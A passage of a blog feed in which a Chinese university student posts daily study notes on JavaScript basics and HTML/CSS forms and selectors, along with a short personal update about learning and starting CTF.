    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="条件分支"><a href="#条件分支" class="headerlink" title="条件分支"></a>条件分支</h4><h5 id="一，if"><a href="#一，if" class="headerlink" title="一，if"></a>一，if</h5><p>括号里的条件表达式计算结果是 true，就会执行对应的代码块<br>如果有多个语句要执行，我们必须将要执行的代码块封装在大括号内</p><h5 id="二，布尔转换"><a href="#二，布尔转换" class="headerlink" title="二，布尔转换"></a>二，布尔转换</h5><p>if语句会计算圆括号内的表达式，并将计算结果转换为布尔型<br>数字0、空字符串””、null、undefined和NaN都会被转换成false。因为它们被称为“假值（falsy）”。<br>其他值被转换为 true，所以它们被称为“真值（truthy）”。</p><h5 id="三，else"><a href="#三，else" class="headerlink" title="三，else"></a>三，else</h5><p>if 语句判断条件不成立，就会执行它内部的代码</p><h5 id="四，多个条件"><a href="#四，多个条件" class="headerlink" title="四，多个条件"></a>四，多个条件</h5><pre><code>let year = prompt(&#39;提示语&#39;, &#39;&#39;);            #设置变量并赋值                                            #prompt相当于inputif (year &lt; 2015) &#123;                          #判断条件  alert( &#39;Too early...&#39; );                  #成立就执行alert，相当于print&#125; else if (year &gt; 2015) &#123;                   #另一个条件判断  alert( &#39;Too late&#39; );&#125; else &#123;                                    #若上面的条件都不满足  alert( &#39;Exactly!&#39; );&#125;                                           #大括号要把整个if语句的执行部分都包含起来</code></pre><h5 id="五，条件运算符"><a href="#五，条件运算符" class="headerlink" title="五，条件运算符?"></a>五，条件运算符?</h5><p>(有时被称为三元运算符,因为该运算符中有三个操作数,它是 JavaScript 中唯一一个有这么多操作数的运算符)<br>根据一个条件去赋值一个变量</p><pre><code>let result = condition ? value1 : value2;计算条件结果，如果结果为真，则返回 value1，否则返回 value2。condition(条件判断)尽量用括号包起来注意空格</code></pre><h5 id="六，多个"><a href="#六，多个" class="headerlink" title="六，多个?"></a>六，多个?</h5><pre><code>let age = prompt(&#39;age?&#39;, 18);let message = (age &lt; 3) ? &#39;Hi, baby!&#39; :  (age &lt; 18) ? &#39;Hello!&#39; :  (age &lt; 100) ? &#39;Greetings!&#39; :  &#39;What an unusual age!&#39;;alert( message );相当于if (age &lt; 3) &#123;  message = &#39;Hi, baby!&#39;;&#125; else if (age &lt; 18) &#123;  message = &#39;Hello!&#39;;&#125; else if (age &lt; 100) &#123;  message = &#39;Greetings!&#39;;&#125; else &#123;  message = &#39;What an unusual age!&#39;;&#125;</code></pre><h5 id="七，-的非常规使用"><a href="#七，-的非常规使用" class="headerlink" title="七，?的非常规使用"></a>七，?的非常规使用</h5><pre><code>有时可以使用问号 ? 来代替 if 语句：let company = prompt(&#39;Which company created JavaScript?&#39;, &#39;&#39;);(company == &#39;Netscape&#39;) ?   alert(&#39;Right!&#39;) : alert(&#39;Wrong.&#39;);注意缩进</code></pre><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><h5 id="（或）"><a href="#（或）" class="headerlink" title="||（或）"></a>||（或）</h5><p>任意一个参数为 true，返回的结果就为 true，否则返回 false<br>如果操作数不是布尔值，那么它将会被转化为布尔值来参与运算<br>例如 1 被作为 true 处理， 0 则被作为 false</p><h5 id="amp-amp-（与）"><a href="#amp-amp-（与）" class="headerlink" title="&amp;&amp;（与）"></a>&amp;&amp;（与）</h5><p>两个操作数都是真值时，与运算返回 true，否则返回 false<br>函数 alert 返回了 undefined,所以会运算并输出alert然后停止</p><h5 id="（非）"><a href="#（非）" class="headerlink" title="!（非）"></a>!（非）</h5><p>将操作数转化为布尔类型：true/false<br>返回相反的值<br>!! 有时候用来将某个值转化为布尔类型<br>(第一个非运算将该值转化为布尔类型并取反，第二个非运算再次取反。就得到了布尔值的转化)</p><h5 id="（空值合并运算符）"><a href="#（空值合并运算符）" class="headerlink" title="??（空值合并运算符）"></a>??（空值合并运算符）</h5><p>a ?? b 的结果是：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第一个参数不是 null/undefined，则返回第一个参数，否则返回第二个参数</p><h5 id="拓展用法"><a href="#拓展用法" class="headerlink" title="拓展用法:"></a>拓展用法:</h5><p>||寻找第一个真值,&amp;&amp;寻找第一个假值</p><p>原理:一个或运算 || 的链，将返回第一个真值，如果不存在真值，就返回该链的最后一个值<br>运用:(a)获取变量列表或者表达式中的第一个真值<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(b)短路求值<br>注意:  &amp;&amp; 的优先级比或 || 要高<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不要用 || 或 &amp;&amp; 来取代 if<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;非运算符 ! 的优先级在所有逻辑运算符里面最高<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;?? 运算符的优先级与 || 相同<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;??返回第一个已定义的值</p><h4 id="请加上括号！！！"><a href="#请加上括号！！！" class="headerlink" title="请加上括号！！！"></a>请加上括号！！！</h4><h3 id="训练-登录校验"><a href="#训练-登录校验" class="headerlink" title="训练(登录校验)"></a>训练(登录校验)</h3><pre><code>let firstName = null;let lastName = null;let nickName = &quot;Supercoder&quot;;// 显示第一个已定义的值：alert(firstName ?? lastName ?? nickName ?? &quot;匿名&quot;);let userName = prompt(&quot;Who&#39;s there?&quot;, &#39;&#39;);if (userName === &#39;Admin&#39;) &#123;  let pass = prompt(&#39;Password?&#39;, &#39;&#39;);  if (pass === &#39;TheMaster&#39;) &#123;    alert( &#39;Welcome!&#39; );  &#125; else if (pass === &#39;&#39; || pass === null) &#123;    alert( &#39;Canceled&#39; );  &#125; else &#123;    alert( &#39;Wrong password&#39; );  &#125;&#125; else if (userName === &#39;&#39; || userName === null) &#123;  alert( &#39;Canceled&#39; );&#125; else &#123;  alert( &quot;I don&#39;t know you&quot; );&#125;</code></pre><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="人的一生中总会有某个时刻，需要坚守自己的决定。一个说“这就是我，这就是我的选择”的时刻。"><a href="#人的一生中总会有某个时刻，需要坚守自己的决定。一个说“这就是我，这就是我的选择”的时刻。" class="headerlink" title="人的一生中总会有某个时刻，需要坚守自己的决定。一个说“这就是我，这就是我的选择”的时刻。"></a>人的一生中总会有某个时刻，需要坚守自己的决定。一个说“这就是我，这就是我的选择”的时刻。</h5>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;h4 id=&quot;条件分支&quot;&gt;&lt;a href=&quot;#条件分支&quot; class=&quot;headerlink&quot; title=&quot;条件分支&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221101</title>
    <link href="https://liu1272.github.io/2022/11/01/b-15/"/>
    <id>https://liu1272.github.io/2022/11/01/b-15/</id>
    <published>2022-11-01T15:32:04.000Z</published>
    <updated>2022-11-02T15:43:15.336Z</updated>
    
    <content type="html"><![CDATA[<h4 id="从今天开始学习JavaScript啦！"><a href="#从今天开始学习JavaScript啦！" class="headerlink" title="从今天开始学习JavaScript啦！"></a>从今天开始学习JavaScript啦！</h4><h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>1.概念<br>&nbsp; &nbsp; 这种编程语言写出来的程序被称为脚本。它们可以被直接写在网页的 HTML 中，在页面加载的时候自动执行。<br>&nbsp; &nbsp; 脚本被以纯文本的形式提供和执行。它们不需要特殊的准备或编译即可运行。<br>2.JavaScript 引擎<br>&nbsp; &nbsp;首先，引擎（如果是浏览器，则引擎被嵌入在其中）读取（“解析”）脚本。<br>&nbsp; &nbsp;然后，引擎将脚本转化（“编译”）为机器语言。<br>&nbsp; &nbsp;然后，机器代码快速地执行。<br>3.作用<br>&nbsp; &nbsp;JavaScript 可以做与网页操作、用户交互和 Web 服务器相关的所有事情。<br>4.局限性<br>&nbsp; &nbsp;(1)网页中的 JavaScript 没有直接访问操作系统的功能。<br>&nbsp; &nbsp;(2)不同的标签页/窗口之间通常互不通信(“同源策略”)为了解决“同源策略”问题，两个标签页必须&lt;都&gt;包含一些处理这个问题的特定的 JavaScript 代码，并均允许数据交换。<br>&nbsp; &nbsp;(3)可以轻松地通过互联网与当前页面所在的服务器进行通信</p><h4 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h4><pre><code>1.markup(标签)   type 特性：&lt;script type=…&gt;                                           #已不需要   language 特性：&lt;script language=…&gt;                                   #已不需要2.外部脚本   将大量的 JavaScript 代码放入一个单独的文件。   脚本文件可以通过 src 特性（attribute）添加到 HTML 文件中。   使用独立文件的好处是浏览器会下载它，然后将它保存到浏览器的 缓存 中。   之后，其他页面想要相同的脚本就会从缓存中获取，而不是下载它。所以文件实际上只会下载一次。   这可以节省流量，并使得页面（加载）更快。   &lt;script src=&quot;路径&quot;&gt;&lt;/script&gt;                                        #要附加多个脚本，请使用多个标签   注意:如果设置了 src 特性，script 标签内容将会被忽略。3.语句   在代码中编写任意数量的语句。语句之间可以使用;进行分割。                #可以放在一行或多行   当存在换行符时，在大多数情况下可以省略分号(自动分号插入)4.注释   单行注释以两个正斜杠字符 // 开始。                                    #Ctrl+/快捷键   /* 多行注释*/5.现代模式(&quot;use strict&quot;)   &quot;use strict&quot; 出现在脚本的最顶部,保证旧的功能能够使用</code></pre><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><pre><code>1.概念   let message;                                                        #创建（声明或者定义）一个名称为“message”的变量   message = &#39;Hello&#39;;                                                  #为变量添加一些数据2.变量命名限制   首字符必须非数字   变量名称必须仅包含字母、数字、符号 $ 和 _   可以将变量定义和赋值合并成一行,也可以在一行中声明多个变量   对于确定不变的变量尽量使用大写3.常数变量   声明一个常数（不变）变量，可以使用const而非let</code></pre><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><pre><code>1.Number 类型   包括整数，浮点数和特殊数值(Infinity、-Infinity 和 NaN)   NaN代表计算错误。它是不正确或者未定义的数学操作所得到的结果,任何对NaN的进一步数学运算都会返回NaN,除了NaN**0=12.BigInt 类型   BigInt用于表示任意长度的整数。可以通过将n附加到整数字段的末尾来创建BigInt值。3.String 类型   字符串必须被括在引号里(单双引号无区别，反引号是功能扩展，允许我们通过将变量和表达式包装在$&#123;…&#125;中)   在反引号内$&#123;…&#125;的表达式会被计算4.Boolean 类型(逻辑类型)   仅包含两个值true和false   布尔值也可作为比较的结果5.null 值   null值不属于上述任何一种类型,它构成了一个独立的类型，只包含 null 值   null仅仅是一个代表“无”、“空”或“值未知”的特殊值6.undefined 值   特殊值undefined和null一样自成类型,undefined的含义是未被赋值   如果一个变量已被声明，但未被赋值，那么它的值就是 undefined   通常使用null将一个“空”或者“未知”的值写入变量，而undefined则保留作为未进行初始化的事物的默认初始值7.Object 类型   object 用于储存数据集合和更复杂的实体8.Symbol 类型   symbol 类型用于创建对象的唯一标识符9..typeof 运算符   typeof 运算符以字符串的形式返回数据类型注:typeof null的结果为&quot;object&quot;。这是官方承认的typeof的错误   typeof alert的结果是&quot;function&quot;,因为alert在JavaScript语言中是一个函数,   函数隶属于object类型。但是typeof会对函数区分对待，并返回&quot;function&quot;   typeof(x)与typeof x相同</code></pre><h4 id="交互"><a href="#交互" class="headerlink" title="交互"></a>交互</h4><pre><code>alert   alert(&quot;Hello&quot;);   显示模态窗(modal) ,直到他们处理完窗口prompt   result = prompt(title, [default]);   显示一个带有文本消息的模态窗口，还有input框和确定/取消按钮   title是显示给用户的文本，default是指定input框的初始值。 (中括号可去)   不提供default的话，浏览器会把undefined插入到prompt   prompt将返回用户在input框内输入的文本，如果用户取消了输入，则返回null   显示一个带有文本消息的模态窗口，还有input框和确定/取消按钮confirm   result = confirm(question);   显示一个带有question以及确定和取消两个按钮的模态窗口。   点击确定返回true,点击取消返回false。限制性:    模态窗口的确切位置由浏览器决定。通常在页面中心。    窗口的确切外观也取决于浏览器。我们不能修改它。</code></pre><h4 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h4><p>字符串转换&nbsp;&nbsp;x = String(x);<br>数字型转换&nbsp;&nbsp;Number(x)x<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;字符串变成NaN(存在字符)或0(除换行符\n制表符\t外为空)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;undefined变成NaN<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;null变成0<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;true 和 false变成1 and 0<br>布尔型转换&nbsp;&nbsp;Boolean(x)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;直观上为“空”的值（如 0、空字符串、null、undefined 和 NaN）将变为 false。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其他值变成 true。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;非空的字符串总是 true(PHP等语言视 “0” 为 false而js不是)</p><p>自动转换:<br>&nbsp;&nbsp;&nbsp;&nbsp;运算符和函数会自动将赋予它们的值转换为正确的类型<br>&nbsp;&nbsp;&nbsp;&nbsp;alert会自动将任何值都转换为字符串以进行显示;算术函数和表达式中会自动进行number类型转换</p><h4 id="基础运算符，数学运算"><a href="#基础运算符，数学运算" class="headerlink" title="基础运算符，数学运算"></a>基础运算符，数学运算</h4><h5 id="详见知识点"><a href="#详见知识点" class="headerlink" title="详见知识点"></a>详见<a href="https://zh.javascript.info/operators#yong-er-yuan-yun-suan-fu-lian-jie-zi-fu-chuan">知识点</a></h5><p>1.加号 + 用于求和<br>&nbsp;&nbsp;&nbsp;应用于字符串，连接各个字符串<br>&nbsp;&nbsp;&nbsp;只要任意一个运算元是字符串，那么另一个运算元也将被转化为字符串</p><p>2.数字转化，一元运算符 +<br>&nbsp;&nbsp;&nbsp;+ 应用于单个值，对数字没有任何作用。但是如果运算元不是数字，加号 + 则会将其转化为数字<br>&nbsp;&nbsp;&nbsp;效果和 Number(…) 相同，但是更加简短</p><p>3.<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Operator_Precedence">运算符优先级</a><br>&nbsp;&nbsp;&nbsp;一元运算符优先级高于二元运算符</p><p>4.其他运算方式<br>&nbsp;&nbsp;&nbsp;链式赋值 a = b = c = 2;<br>&nbsp;&nbsp;&nbsp;原地修改 n += 5;<br>&nbsp;&nbsp;&nbsp;自增/自减counter++;相当于counter = counter + 1;<br>&nbsp;&nbsp;&nbsp;自增/自减只能应用于变量，应用于数值（比如 5++）会报错<br>&nbsp;&nbsp;&nbsp;运算符 ++ 和 – 可以置于变量前，也可以置于变量后。<br>&nbsp;&nbsp;&nbsp;++和–放在前面使用的是自增后的值，放在后面是自增前的值<br>&nbsp;&nbsp;&nbsp;位运算符及<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Expressions_and_Operators#bitwise_operators">位操作符</a>:按位与 ( &amp; )按位或 ( | )按位异或 ( ^ )按位非 ( ~ )左移 ( &lt;&lt; )右移 ( &gt;&gt; )无符号右移 ( &gt;&gt;&gt; )<br>&nbsp;&nbsp;&nbsp;逗号运算符丢弃逗号前的结果，保留逗号后的</p><h4 id="值的比较"><a href="#值的比较" class="headerlink" title="值的比较"></a>值的比较</h4><p>一，比较结果为 Boolean 类型<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所有比较运算符均返回布尔值<br>二，字符串比较<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;按字符（母）逐个进行比较的<br>三，不同类型间的比较<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;先将其转化为数字再判定大小(true 会被转化为 1、false 转化为 0)<br>四，严格相等<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;严格相等运算符 === 在进行比较时不会做任何的类型转换(属于不同的数据类型就立刻返回 false)<br>五，比较 null 和 undefined<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;严格相等 === 比较二者时false<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;非严格相等 == 比较二者时true<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;数学式或其他比较方法 &lt; &gt; &lt;= &gt;= 时null 被转化为 0，undefined 被转化为 NaN<br>六，其它<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;null 会被转化为0<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;undefined 在比较中被转换为了 NaN，而 NaN 是一个特殊的数值型值，它与任何值进行比较都会返回 false<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;undefined 只与 null 相等</p><h4 id="总结问题"><a href="#总结问题" class="headerlink" title="总结问题"></a>总结问题</h4><pre><code>比较运算符始终返回布尔值。字符串的比较，会按照“词典”顺序逐字符地比较大小。当对不同类型的值进行比较时，它们会先被转化为数字（不包括严格相等检查）再进行比较。在非严格相等 == 下，null 和 undefined 相等且各自不等于任何其他的值。在使用 &gt; 或 &lt; 进行比较时，需要注意变量可能为 null/undefined 的情况。比较好的方法是单独检查变量是否等于 null/undefined。对于取值可能是 null/undefined 的变量，请按需要分别检查它的取值情况。除了严格相等 === 外，其他但凡是有 undefined/null 参与的比较，我们都需要格外小心。除非你非常清楚自己在做什么，否则永远不要使用 &gt;= &gt; &lt; &lt;= 去比较一个可能为 null/undefined 的变量。</code></pre><h2 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h2><h4 id="一愿识尽天下好人，二愿读尽世间好书，三愿看尽人间好山水。"><a href="#一愿识尽天下好人，二愿读尽世间好书，三愿看尽人间好山水。" class="headerlink" title="一愿识尽天下好人，二愿读尽世间好书，三愿看尽人间好山水。"></a>一愿识尽天下好人，二愿读尽世间好书，三愿看尽人间好山水。</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;从今天开始学习JavaScript啦！&quot;&gt;&lt;a href=&quot;#从今天开始学习JavaScript啦！&quot; class=&quot;headerlink&quot; title=&quot;从今天开始学习JavaScript啦！&quot;&gt;&lt;/a&gt;从今天开始学习JavaScript啦！&lt;/h4&gt;&lt;h3 i</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221031</title>
    <link href="https://liu1272.github.io/2022/10/31/b-13/"/>
    <id>https://liu1272.github.io/2022/10/31/b-13/</id>
    <published>2022-10-31T15:32:04.000Z</published>
    <updated>2022-11-02T15:42:28.554Z</updated>
    
    <content type="html"><![CDATA[<p>好久没更新了<br>不是不想写，而是真的没时间写。<br>因为大学牲……</p><p>——————————卑微的分割线——————————</p><p>首先简述一下过去一个月的收获<br>1.当然是搭建了这个HexoBlog啦！！！虽然有人吐槽简陋而且没有服务器，但是这终归是我自己搭建的我所喜欢的博客。<br>  所以，请不要随意评论我的Blog哦~~<br>2.简简单单地学习了HTML和CSS，大概能够手搓一个非常非常简单的前端页面了<br>3.入门了CTF，这也是我这一个月所有忙活的目标。<br>  在这一个月里，经过无数次的磕磕碰碰，付出了无数的精力后，从一个完完全全的小白蜕变成了能够自己觅食寻找出路的初学者<br>4.参加了各种各样的社团面试和活动，每天都安排得满满的真的很累</p><p>然后再说一下未来的目标<br>1.肯定是继续学习前端JS还有后端PHP<br>2.写题啥的先放一下，因为靠写题来学习知识效率太低了<br>3.努力学好高数和线代……(希望)<br>4希望能够加入方班预备班？？？不是，咋我刚写下来就发通知通过了？？？</p><p>最后唠嗑两句<br>想结果的花，都早早低头;时人不识凌云木，直待凌云始道高。</p><p>—————————还是卑微的分割线—————————</p><p>附:<br>欢迎来看看我的<a href="https://gitmind.cn/app/doc/48spll2fph">笔记</a> ————&gt; 问题很多所以看看就好，保质期一个月</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;好久没更新了&lt;br&gt;不是不想写，而是真的没时间写。&lt;br&gt;因为大学牲……&lt;/p&gt;
&lt;p&gt;——————————卑微的分割线——————————&lt;/p&gt;
&lt;p&gt;首先简述一下过去一个月的收获&lt;br&gt;1.当然是搭建了这个HexoBlog啦！！！虽然有人吐槽简陋而且没有服务器，但是这</summary>
      
    
    
    
    <category term="随笔" scheme="https://liu1272.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="随笔" scheme="https://liu1272.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>20221031</title>
    <link href="https://liu1272.github.io/2022/10/31/b-14/"/>
    <id>https://liu1272.github.io/2022/10/31/b-14/</id>
    <published>2022-10-31T15:32:04.000Z</published>
    <updated>2022-11-02T15:43:02.754Z</updated>
    
    <content type="html"><![CDATA[<h1 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h1><h3 id="复选框"><a href="#复选框" class="headerlink" title="复选框"></a>复选框</h3><pre><code>&lt;input type=&quot;radio&quot; name=&quot;1&quot; id=&quot;man&quot;&gt;&lt;label for=&quot;man&quot;&gt;男&lt;/label&gt;这里做一个补充:id是为了点击文字也可以选中，不然就只能点击那个圈来选了回归正轨1.type=&quot;checkbox&quot;可以多选2.type=&quot;checkbox&quot; checked=&quot;checked&quot;就能变成默认选中3.disabled=&quot;disabled&quot;或者disabled可以禁用该模块4.readonly是只读不能改</code></pre><h3 id="下拉菜单"><a href="#下拉菜单" class="headerlink" title="下拉菜单"></a>下拉菜单</h3><pre><code>&lt;body&gt;    &lt;select size=&quot;3&quot; multiple&gt;                              #size是一面可显示的选项  multiple是可多选        &lt;option value=&quot;a&quot;&gt;&lt;/option&gt;        &lt;option value=&quot;b&quot;&gt;&lt;/option&gt;                         #value是提供给后端使用的value值        &lt;option value=&quot;c&quot;&gt;&lt;/option&gt;        &lt;option value=&quot;d&quot; selected&gt;&lt;/option&gt;                #selected默认选中    &lt;/select&gt;&lt;/body&gt;</code></pre><h3 id="文本域-多行文本输入框"><a href="#文本域-多行文本输入框" class="headerlink" title="文本域(多行文本输入框)"></a>文本域(多行文本输入框)</h3><pre><code>&lt;div&gt;    &lt;textarea name=&quot;&quot; id=&quot;&quot; cols=&quot;30&quot; rows=&quot;10&quot; placeholder=&quot;&quot;&gt;内容&lt;/textarea&gt;&lt;/div&gt;cols是列   rows是行placeholder是预置文本，输入就会消失&lt;style&gt;    textarea&#123;        width:100px;        height:100px;        resize:vertical;    &#125;&lt;/style&gt;horizontal水平可调节both都可以none不能更改注意:placeholder的默认value是两个标识符之间的，换行也会跟着换行</code></pre><h3 id="字段集"><a href="#字段集" class="headerlink" title="字段集"></a>字段集</h3><pre><code>&lt;fieldset&gt;    &lt;legend&gt;内容1&lt;/legend&gt;    &lt;input type=&quot;radio&quot; name=&quot;aaa&quot;&gt;选项1    &lt;input type=&quot;radio&quot; name=&quot;aaa&quot;&gt;选项2    &lt;legend&gt;内容2&lt;/legend&gt;&lt;/fieldset&gt;</code></pre><h2 id="HTML5"><a href="#HTML5" class="headerlink" title="HTML5"></a>HTML5</h2><p>1.指定UTF-8<br>2.增加语义化标签(便于爬虫)<br>&nbsp;&nbsp; section,article,aside,header,footer,nav,figure,main<br>3.可以省略结束标签(最好不要)<br>4.在标签中可以使用单引号<br>5.音视频标签</p><pre><code>&lt;body&gt;    &lt;audio src=&quot;路径&quot; cintrols&gt;&lt;/audio&gt;    &lt;video src=&quot;路径&quot; poster=&quot;路径&quot;&gt;&lt;/video&gt;&lt;/body&gt;controls 可控制loop 循环autoplay 自动播放muted 静音播放poster 海报注意:设置宽高要适应视频画面大小</code></pre><h3 id="表单增强-以上传后端为例"><a href="#表单增强-以上传后端为例" class="headerlink" title="表单增强(以上传后端为例)"></a>表单增强(以上传后端为例)</h3><pre><code>一，颜色选择&lt;form action=&quot;action&quot;&gt;    &lt;input type=&quot;color&quot; name=&quot;aaa&quot; autofocus&gt;            #选择颜色，autofocus光标默认在这里    &lt;input type=&quot;email&quot; name=&quot;mymail&quot; required&gt;          #选择邮箱，required必填项    &lt;input type=&quot;url&quot; name=&quot;bbb&quot; multiple&gt;               #选择地址，multiple可选择多个地址，用逗号隔开    &lt;input type=&quot;tel&quot; name=&quot;ccc&quot;&gt;                        #tel只在手机端有用，显示输入页面    &lt;input type=&quot;range&quot; name=&quot;ddd&quot; min=&quot;100&quot; max=&quot;1000&quot; value=&quot;100&quot; step=&quot;10&quot;&gt;    #range滑块效果    &lt;input type=&quot;number&quot; name=&quot;eee&quot; min=&quot;0&quot; max=&quot;10&quot; value=&quot;4&quot; step=&quot;2&quot;&gt;          #选择数字，value是初始数据    &lt;input type=&quot;search&quot; name=&quot;fff&quot;&gt;                     #搜索框    &lt;input type=&quot;date&quot; name=&quot;ggg&quot;&gt;                       #选择日期，type改成month是精确到月份    &lt;input type=&quot;datetime-local&quot; name=&quot;hhh&quot;&gt;             #精确到秒&lt;/form&gt;注意！！！没有name就不能传到后端，提交了会在url上显示二，数据列表&lt;body&gt;    &lt;input type=&quot;text&quot; list=&quot;mylist&quot;&gt;              这里的list    &lt;datalist id=&quot;mylist&quot;&gt;                         和这里的id关联        &lt;option value=&quot;111111&quot;&gt;&lt;/option&gt;        &lt;option value=&quot;2433445&quot;&gt;&lt;/option&gt;        &lt;option value=&quot;333436653&quot;&gt;&lt;/option&gt;        上面输入就可以在下面显示有关的内容        &lt;option value=&quot;4、3、78&quot;&gt;&lt;/option&gt;    &lt;/datalist&gt;&lt;/body&gt;三，正则表达式在input中加入 pattern=&quot;[0-9][A-Z]&#123;3&#125;&quot;代表第一个要是0-9的，后面接着三个要是A-Z的</code></pre><h2 id="CSS3"><a href="#CSS3" class="headerlink" title="CSS3"></a>CSS3</h2><h4 id="选择器回顾-更新"><a href="#选择器回顾-更新" class="headerlink" title="选择器回顾+更新"></a>选择器回顾+更新</h4><pre><code>一，层级选择器+属性选择器&lt;style&gt;    .child+li&#123;                       #这个child后面的第一个同级的li标签改变        background:red;            &#125;    .child~li&#123;                       #这个后面所有同级的li标签都改变        background:red;    &#125;    div[class]&#123;                      #所有div而且有class的都改变        background:red;    &#125;    div [class]&#123;                     #加了空格，div后代有class的都改变        background:red;    &#125;    div[class=box1]&#123;                 #是div而且属性是box1的才改变        background:red;    &#125;&lt;/style&gt;拓展————模糊匹配:class^&quot;b&quot;   以b开头的class$&quot;b&quot;   以b结尾的class*&quot;b&quot;   包含b的二，结构伪类选择器&lt;style&gt;    ul li:first-child&#123;       #选择第一个        color:red;    &#125;    ul li:last-child&#123;        #最后一个        color:red;    &#125;    li:nth-child(odd)&#123;       #选定第几个，odd/2n+1/2n-1是奇数，2n/even是偶数        color:red;    &#125;    li:nth-onlychild&#123;        #匹配div下而且只有一个p的        color:red;    &#125;    div:empty&#123;               #匹配根元素(HTML)        color:red;    &#125;    :root,body&#123;              #匹配没有任何元素的，包括空格        color:red;    &#125;&lt;/style&gt;三，目标伪类选择器div.&#123;                        #先让全部使用一个style    display:none;&#125;div.:target&#123;                 #再让点到的目标换成指定的style    display:block;&#125;四，UI状态伪类选择器input:checked&#123;               #匹配选择的    background:red;  &#125;        input:focus&#123;         #匹配手动focus的    background:red;&#125;四，否定伪类选择器li:not(:nth-child(2n+1))&#123;    #匹配所有不匹配的    color:red;&#125;其它:X:link  链接伪类选择器，超链接未被访问过的X:visited  链接伪类选择器，超链接被访问过的X:active  用户行为选择器，被激活的(常用于链接)X:hover  用户行为选择器，停留在上方的</code></pre><h3 id="阴影"><a href="#阴影" class="headerlink" title="阴影"></a>阴影</h3><pre><code>文本阴影div&#123;    